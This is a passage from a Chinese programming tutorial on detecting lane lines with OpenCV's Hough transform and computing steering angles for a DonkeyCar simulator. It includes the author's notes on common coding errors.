&#x27;&#x27;&#x27;</span></span><br><span class="line">    height, width= frame.shape</span><br><span class="line">    slope, intercept = line</span><br><span class="line">    y1 = height</span><br><span class="line">    y2 = <span class="built_in">int</span>(y1 * <span class="number">1</span> / <span class="number">2</span>)</span><br><span class="line">    x1 = <span class="built_in">max</span>(-width, <span class="built_in">min</span>(<span class="number">2</span> * width, <span class="built_in">int</span>((y1 - intercept) / slope)))</span><br><span class="line">    x2 = <span class="built_in">max</span>(-width, <span class="built_in">min</span>(<span class="number">2</span> * width, <span class="built_in">int</span>((y2 - intercept) / slope)))</span><br><span class="line">    <span class="keyword">return</span> [[x1, y1, x2, y2]]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">display_line</span>(<span class="params">frame, lines, line_color=(<span class="params"><span class="number">0</span>,<span class="number">0</span>,<span class="number">255</span></span>), line_width=<span class="number">2</span></span>):</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    在原图上展示线段</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    line_img = np.zeros_like(frame)</span><br><span class="line">    <span class="keyword">if</span> lines <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">for</span> line <span class="keyword">in</span> lines:</span><br><span class="line">            <span class="keyword">for</span> x1, y1, x2, y2 <span class="keyword">in</span> line:</span><br><span class="line">                cv2.line(line_img, (x1, y1), (x2, y2), line_color, line_width)</span><br><span class="line">    line_img = cv2.addWeighted(frame, <span class="number">0.8</span>, line_img, <span class="number">1</span>, <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">return</span> line_img</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    yimg = cv2.imread(<span class="string">&#x27;yellow_edge_new.jpg&#x27;</span>,<span class="number">0</span>)</span><br><span class="line">    wimg = cv2.imread(<span class="string">&#x27;white_edge_new.jpg&#x27;</span>,<span class="number">0</span>)</span><br><span class="line">    <span class="comment">#霍夫变换</span></span><br><span class="line">    yimg_detect_line = detect_line(yimg)</span><br><span class="line">    wimg_detect_line = detect_line(wimg)</span><br><span class="line">    <span class="comment">#小线段聚类</span></span><br><span class="line">    yimg_average_lines = average_lines(yimg,yimg_detect_line,direction=<span class="string">&#x27;right&#x27;</span>)</span><br><span class="line">    wimg_average_lines = average_lines(wimg,wimg_detect_line)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#在原图上展示线段</span></span><br><span class="line">    y=cv2.imread(<span class="string">&#x27;test.jpg&#x27;</span>)</span><br><span class="line">    w=cv2.imread(<span class="string">&#x27;test.jpg&#x27;</span>)</span><br><span class="line">    yellow_display_line = display_line(y, yimg_average_lines)</span><br><span class="line">    white_display_line = display_line(w, wimg_average_lines)</span><br><span class="line">    cv2.imwrite(<span class="string">&#x27;yellow_display_line.jpg&#x27;</span>, yellow_display_line)</span><br><span class="line">    cv2.imwrite(<span class="string">&#x27;white_display_line.jpg&#x27;</span>, white_display_line)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="comment">#函数入口</span></span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>我们来分析一下几段容易出错的代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(fits) &gt; <span class="number">0</span>:</span><br><span class="line">        fit_average = np.average(fits, axis=<span class="number">0</span>)</span><br><span class="line">        lane_lines.append(make_points(frame, fit_average))</span><br></pre></td></tr></table></figure><p>注意此处已经嵌套调用了make_points函数，返回了图片的x，y坐标。后续不需要再进行make_points，否则将会出现传入参数错误。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    yimg = cv2.imread(<span class="string">&#x27;yellow_edge_new.jpg&#x27;</span>,<span class="number">0</span>)</span><br><span class="line">    wimg = cv2.imread(<span class="string">&#x27;white_edge_new.jpg&#x27;</span>,<span class="number">0</span>)</span><br></pre></td></tr></table></figure><p>这里imread后面多带一个参数0，表示以单通道读入。即使图像显示为黑白，它仍然可能是三通道的，而yimg_detect_line中HoughLinesP霍夫变换只接受单通道的图片。这里不加0这个参数将会出现错误。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">display_line</span>(<span class="params">frame, lines, line_color=(<span class="params"><span class="number">0</span>,<span class="number">0</span>,<span class="number">255</span></span>), line_width=<span class="number">2</span></span>):</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    在原图上展示线段</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p>注意line_color传入的rgb三色值是倒过来的，实际上红色对应的是(255，0，0)，而(0， 0， 255)是紫蓝色(?)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">height, width= frame.shape</span><br></pre></td></tr></table></figure><p>某些.shape返回的是三个参数，第三个表示的是通道数。一般用_ 来接收这个不需要用到的通道数，而此处不会返回这个值，所以加入_ 会出错。实际应该根据编译器的提示进行修改(因为我也没摸透为什么，可能图片经过其他函数的一些转换后，不会返回这个参数。实际上修改起来也比较简单。)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#在原图上展示线段</span></span><br><span class="line">    y=cv2.imread(<span class="string">&#x27;test.jpg&#x27;</span>)</span><br><span class="line">    w=cv2.imread(<span class="string">&#x27;test.jpg&#x27;</span>)</span><br><span class="line">    yellow_display_line = display_line(y, yimg_average_lines)</span><br><span class="line">    white_display_line = display_line(w, wimg_average_lines)</span><br><span class="line">    cv2.imwrite(<span class="string">&#x27;yellow_display_line.jpg&#x27;</span>, yellow_display_line)</span><br><span class="line">    cv2.imwrite(<span class="string">&#x27;white_display_line.jpg&#x27;</span>, white_display_line)</span><br></pre></td></tr></table></figure><p>这里读入我们拍摄的彩色图片，将红色的线段合成上去。整体代码运行结果如下：</p><p><img src="/.io//white_display_line.jpg"></p><p><img src="/.io//yellow_display_line.jpg"></p><p> 从效果上看我们准确的将两条行道线检测了出来。接下来就是根据这两条行道线进行自动驾驶方向控制。 </p><h3 id="2-5动作控制：转向角"><a href="#2-5动作控制：转向角" class="headerlink" title="2.5动作控制：转向角"></a>2.5动作控制：转向角</h3><p>针对前面的测试图片，我们可以有效的检测出两条行道线（左侧黄色线和右侧白色线），但是在真实的运行过程中，可能会出现3种情况：</p><p>(1)正常检测到2条行道线：这种情况一般是直线车道且车辆稳定运行在行道线内，这时候我们只需要根据检测出的两条行道线微调整角度即可。</p><p>(2)检测出1条行道线：这种情况在转弯处容易出现，或者在车辆开始大范围偏离时出现，这时候我们的策略应该是向能够检测到的这条行道线方向前进。</p><p>(3)检测不到行道线：这种情况应该停下小车。</p><p>因此，针对三种情况我们需要不同的处理方式。代码如下所示：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 计算转向角</span></span><br><span class="line">x_offset = <span class="number">0</span></span><br><span class="line">y_offset = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(yellow_lane)&gt;<span class="number">0</span> <span class="keyword">and</span> <span class="built_in">len</span>(white_lane)&gt;<span class="number">0</span>:  <span class="comment"># 检测到2条线</span></span><br><span class="line">    _, _, left_x2, _ = yellow_lane[<span class="number">0</span>][<span class="number">0</span>]</span><br><span class="line">    _, _, right_x2, _ = white_lane[<span class="number">0</span>][<span class="number">0</span>]</span><br><span class="line">    mid = <span class="built_in">int</span>(width / <span class="number">2</span>)</span><br><span class="line">    x_offset = (left_x2 + right_x2) / <span class="number">2</span> - mid</span><br><span class="line">    y_offset = <span class="built_in">int</span>(height / <span class="number">2</span>)</span><br><span class="line"><span class="keyword">elif</span> <span class="built_in">len</span>(yellow_lane)&gt;<span class="number">0</span> <span class="keyword">and</span> <span class="built_in">len</span>(yellow_lane[<span class="number">0</span>])==<span class="number">1</span>:  <span class="comment"># 只检测到黄色行道线</span></span><br><span class="line">    x1, _, x2, _ = yellow_lane[<span class="number">0</span>][<span class="number">0</span>]</span><br><span class="line">    x_offset = x2 - x1</span><br><span class="line">    y_offset = <span class="built_in">int</span>(height / <span class="number">2</span>)</span><br><span class="line"><span class="keyword">elif</span> <span class="built_in">len</span>(white_lane)&gt;<span class="number">0</span> <span class="keyword">and</span> <span class="built_in">len</span>(white_lane[<span class="number">0</span>])==<span class="number">1</span>:  <span class="comment"># 只检测到白色行道线</span></span><br><span class="line">    x1, _, x2, _ = white_lane[<span class="number">0</span>][<span class="number">0</span>]</span><br><span class="line">    x_offset = x2 - x1</span><br><span class="line">    y_offset = <span class="built_in">int</span>(height / <span class="number">2</span>)</span><br><span class="line"><span class="keyword">else</span>: <span class="comment"># 一条线都没检测到</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;检测不到行道线，退出程序&#x27;</span>)</span><br><span class="line">    <span class="keyword">break</span></span><br><span class="line"> </span><br><span class="line">angle_to_mid_radian = math.atan(x_offset / y_offset)  </span><br><span class="line">angle_to_mid_deg = <span class="built_in">int</span>(angle_to_mid_radian * <span class="number">180.0</span> / math.pi) </span><br><span class="line">steering_angle = angle_to_mid_deg/<span class="number">45.0</span></span><br><span class="line">action = np.array([steering_angle, <span class="number">0.3</span>])  <span class="comment"># 油门值恒定</span></span><br></pre></td></tr></table></figure><p> 到这里我们就可以开始启动程序了。完整代码如下所示： </p><p>先编写自定义库tools：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> cv2</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">detect_line</span>(<span class="params">edges</span>):</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    基于霍夫变换的直线检测</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    rho = <span class="number">1</span>  <span class="comment"># 距离精度：1像素</span></span><br><span class="line">    angle = np.pi / <span class="number">180</span>  <span class="comment"># 角度精度：1度</span></span><br><span class="line">    min_thr = <span class="number">10</span>  <span class="comment"># 最少投票数</span></span><br><span class="line">    lines = cv2.HoughLinesP(edges,rho, angle,min_thr,np.array([]),minLineLength=<span class="number">8</span>,maxLineGap=<span class="number">8</span>)</span><br><span class="line">    <span class="keyword">return</span> lines</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">average_lines</span>(<span class="params">frame, lines, direction=<span class="string">&#x27;left&#x27;</span></span>):</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    小线段聚类</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    lane_lines = []</span><br><span class="line">    <span class="keyword">if</span> lines <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="built_in">print</span>(direction + <span class="string">&#x27;没有检测到线段&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> lane_lines</span><br><span class="line">    <span class="comment">#height, width , _= frame.shape</span></span><br><span class="line">    fits = []</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> lines:</span><br><span class="line">        <span class="keyword">for</span> x1, y1, x2, y2 <span class="keyword">in</span> line:</span><br><span class="line">            <span class="keyword">if</span> x1 == x2:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="comment"># 计算拟合直线</span></span><br><span class="line">            fit = np.polyfit((x1, x2), (y1, y2), <span class="number">1</span>)</span><br><span class="line">            slope = fit[<span class="number">0</span>]</span><br><span class="line">            intercept = fit[<span class="number">1</span>]</span><br><span class="line">            <span class="keyword">if</span> direction == <span class="string">&#x27;left&#x27;</span> <span class="keyword">and</span> slope &lt; <span class="number">0</span>:</span><br><span class="line">                fits.append((slope, intercept))</span><br><span class="line">            <span class="keyword">elif</span> direction == <span class="string">&#x27;right&#x27;</span> <span class="keyword">and</span> slope &gt; <span class="number">0</span>:</span><br><span class="line">                fits.append((slope, intercept))</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(fits) &gt; <span class="number">0</span>:</span><br><span class="line">        fit_average = np.average(fits, axis=<span class="number">0</span>)</span><br><span class="line">        lane_lines.append(make_points(frame, fit_average))</span><br><span class="line">    <span class="keyword">return</span> lane_lines</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">make_points</span>(<span class="params">frame, line</span>):</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    根据直线斜率和截距计算线段起始坐标</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    height, width, _ = frame.shape</span><br><span class="line">    slope, intercept = line</span><br><span class="line">    y1 = height</span><br><span class="line">    y2 = <span class="built_in">int</span>(y1 * <span class="number">1</span> / <span class="number">2</span>)</span><br><span class="line">    x1 = <span class="built_in">max</span>(-width, <span class="built_in">min</span>(<span class="number">2</span> * width, <span class="built_in">int</span>((y1 - intercept) / slope)))</span><br><span class="line">    x2 = <span class="built_in">max</span>(-width, <span class="built_in">min</span>(<span class="number">2</span> * width, <span class="built_in">int</span>((y2 - intercept) / slope)))</span><br><span class="line">    <span class="keyword">return</span> [[x1, y1, x2, y2]]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">display_line</span>(<span class="params">frame, lines, line_color=(<span class="params"><span class="number">0</span>,<span class="number">0</span>,<span class="number">255</span></span>), line_width=<span class="number">2</span></span>):</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    在原图上展示线段</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    line_img = np.zeros_like(frame)</span><br><span class="line">    <span class="keyword">if</span> lines <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">for</span> line <span class="keyword">in</span> lines:</span><br><span class="line">            <span class="keyword">for</span> x1, y1, x2, y2 <span class="keyword">in</span> line:</span><br><span class="line">                cv2.line(line_img, (x1, y1), (x2, y2), line_color, line_width)</span><br><span class="line">    line_img = cv2.addWeighted(frame, <span class="number">0.8</span>, line_img, <span class="number">1</span>, <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">return</span> line_img</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    yimg = cv2.imread(<span class="string">&#x27;yellow_edge_new.jpg&#x27;</span>,<span class="number">0</span>)</span><br><span class="line">    wimg = cv2.imread(<span class="string">&#x27;white_edge_new.jpg&#x27;</span>,<span class="number">0</span>)</span><br><span class="line">    <span class="comment">#霍夫变换</span></span><br><span class="line">    yimg_detect_line = detect_line(yimg)</span><br><span class="line">    wimg_detect_line = detect_line(wimg)</span><br><span class="line">    <span class="comment">#小线段聚类</span></span><br><span class="line">    yimg_average_lines = average_lines(yimg,yimg_detect_line,direction=<span class="string">&#x27;right&#x27;</span>)</span><br><span class="line">    wimg_average_lines = average_lines(wimg,wimg_detect_line)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#在原图上展示线段</span></span><br><span class="line">    y=cv2.imread(<span class="string">&#x27;test.jpg&#x27;</span>)</span><br><span class="line">    w=cv2.imread(<span class="string">&#x27;test.jpg&#x27;</span>)</span><br><span class="line">    yellow_display_line = display_line(y, yimg_average_lines)</span><br><span class="line">    white_display_line = display_line(w, wimg_average_lines)</span><br><span class="line">    cv2.imwrite(<span class="string">&#x27;yellow_display_line.jpg&#x27;</span>, yellow_display_line)</span><br><span class="line">    cv2.imwrite(<span class="string">&#x27;white_display_line.jpg&#x27;</span>, white_display_line)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">region_of_interest</span>(<span class="params">edges, color=<span class="string">&#x27;yellow&#x27;</span></span>):</span><br><span class="line">        <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        感兴趣区域提取</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span></span><br><span class="line">        height, width = edges.shape</span><br><span class="line">        mask = np.zeros_like(edges)</span><br><span class="line">        <span class="comment"># 定义感兴趣区域掩码轮廓</span></span><br><span class="line">        <span class="keyword">if</span> color == <span class="string">&#x27;yellow&#x27;</span>:</span><br><span class="line">            polygon = np.array([[(width * <span class="number">1</span> / <span class="number">2</span>, height * <span class="number">1</span> / <span class="number">2</span>),</span><br><span class="line">                                 (width, height * <span class="number">1</span> / <span class="number">2</span>),</span><br><span class="line">                                 (width, height),</span><br><span class="line">                                 (width * <span class="number">1</span> / <span class="number">2</span>, height)]], np.int32)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            polygon = np.array([[(<span class="number">0</span>, height * <span class="number">1</span> / <span class="number">2</span>),</span><br><span class="line">                                 (width * <span class="number">1</span> / <span class="number">2</span>, height * <span class="number">1</span> / <span class="number">2</span>),</span><br><span class="line">                                 (width * <span class="number">1</span> / <span class="number">2</span>, height),</span><br><span class="line">                                 (<span class="number">0</span>, height)]], np.int32)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 填充感兴趣区域掩码</span></span><br><span class="line">        cv2.fillPoly(mask, polygon, (<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>))</span><br><span class="line">        <span class="comment"># 提取感兴趣区域</span></span><br><span class="line">        croped_edge = cv2.bitwise_and(edges, mask)</span><br><span class="line">        <span class="keyword">return</span> croped_edge</span><br></pre></td></tr></table></figure><p>再编写主函数入口：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 导入系统库</span></span><br><span class="line"><span class="keyword">import</span> cv2</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> math</span><br><span class="line"><span class="keyword">import</span> gym</span><br><span class="line"><span class="keyword">import</span> gym_donkeycar</span><br><span class="line"></span><br><span class="line"><span class="comment"># 导入自定义库</span></span><br><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> region_of_interest, detect_line, make_points, average_lines, display_line</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    主函数</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="comment"># 设置模拟器环境</span></span><br><span class="line">    env = gym.make(<span class="string">&quot;donkey-generated-roads-v0&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 重置当前场景</span></span><br><span class="line">    obv = env.reset()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 开始启动</span></span><br><span class="line">    action = np.array([<span class="number">0</span>, <span class="number">1</span>])  <span class="comment"># 动作控制，第1个转向值，第2个油门值</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 执行动作</span></span><br><span class="line">    obv, reward, done, info = env.step(action)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 获取图像</span></span><br><span class="line">    frame = cv2.cvtColor(obv, cv2.COLOR_RGB2BGR)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 运行1000次动作</span></span><br><span class="line">    <span class="keyword">for</span> t <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1000</span>):</span><br><span class="line">        <span class="comment"># 转换图像到HSV空间</span></span><br><span class="line">        height, width, _ = frame.shape</span><br><span class="line">        hsv = cv2.cvtColor(frame, cv2.COLOR_BGR2HSV)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 黄色区域检测</span></span><br><span class="line">        lower_blue = np.array([<span class="number">15</span>, <span class="number">40</span>, <span class="number">40</span>])</span><br><span class="line">        upper_blue = np.array([<span class="number">45</span>, <span class="number">255</span>, <span class="number">255</span>])</span><br><span class="line">        yellow_mask = cv2.inRange(hsv, lower_blue, upper_blue)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 白色区域检测</span></span><br><span class="line">        lower_blue = np.array([<span class="number">0</span>, <span class="number">0</span>, <span class="number">200</span>])</span><br><span class="line">        upper_blue = np.array([<span class="number">180</span>, <span class="number">30</span>, <span class="number">255</span>])</span><br><span class="line">        white_mask = cv2.inRange(hsv, lower_blue, upper_blue)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 黄色线边缘提取</span></span><br><span class="line">        yellow_edge = cv2.Canny(yellow_mask, <span class="number">200</span>, <span class="number">400</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 白色线边缘提取</span></span><br><span class="line">        white_edge = cv2.Canny(white_mask, <span class="number">200</span>, <span class="number">400</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 黄色线感兴趣区域提取</span></span><br><span class="line">        yellow_roi = region_of_interest(yellow_edge, color=<span class="string">&#x27;yellow&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 白色线感兴趣区域提取</span></span><br><span class="line">        white_roi = region_of_interest(white_edge, color=<span class="string">&#x27;white&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 黄色线段检测</span></span><br><span class="line">        yellow_lines = detect_line(yellow_roi)</span><br><span class="line">        yellow_lane = average_lines(frame, yellow_lines, direction=<span class="string">&#x27;right&#x27;</span>)</span><br><span class="line">        <span class="comment"># yellow_show = display_line(frame, yellow_lane)</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 白色线段检测</span></span><br><span class="line">        white_lines = detect_line(white_roi)</span><br><span class="line">        white_lane = average_lines(frame, white_lines, direction=<span class="string">&#x27;left&#x27;</span>)</span><br><span class="line">        <span class="comment"># white_show = display_line(frame, white_lane, line_color=(255, 0, 0))</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 计算转向角</span></span><br><span class="line">        x_offset = <span class="number">0</span></span><br><span class="line">        y_offset = <span class="number">0</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(yellow_lane) &gt; <span class="number">0</span> <span class="keyword">and</span> <span class="built_in">len</span>(white_lane) &gt; <span class="number">0</span>:  <span class="comment"># 检测到2条线</span></span><br><span class="line">            _, _, left_x2, _ = yellow_lane[<span class="number">0</span>][<span class="number">0</span>]</span><br><span class="line">            _, _, right_x2, _ = white_lane[<span class="number">0</span>][<span class="number">0</span>]</span><br><span class="line">            mid = <span class="built_in">int</span>(width / <span class="number">2</span>)</span><br><span class="line">            x_offset = (left_x2 + right_x2) / <span class="number">2</span> - mid</span><br><span class="line">            y_offset = <span class="built_in">int</span>(height / <span class="number">2</span>)</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">len</span>(yellow_lane) &gt; <span class="number">0</span> <span class="keyword">and</span> <span class="built_in">len</span>(yellow_lane[<span class="number">0</span>]) == <span class="number">1</span>:  <span class="comment"># 只检测到黄色行道线</span></span><br><span class="line">            x1, _, x2, _ = yellow_lane[<span class="number">0</span>][<span class="number">0</span>]</span><br><span class="line">            x_offset = x2 - x1</span><br><span class="line">            y_offset = <span class="built_in">int</span>(height / <span class="number">2</span>)</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">len</span>(white_lane) &gt; <span class="number">0</span> <span class="keyword">and</span> <span class="built_in">len</span>(white_lane[<span class="number">0</span>]) == <span class="number">1</span>:  <span class="comment"># 只检测到白色行道线</span></span><br><span class="line">            x1, _, x2, _ = white_lane[<span 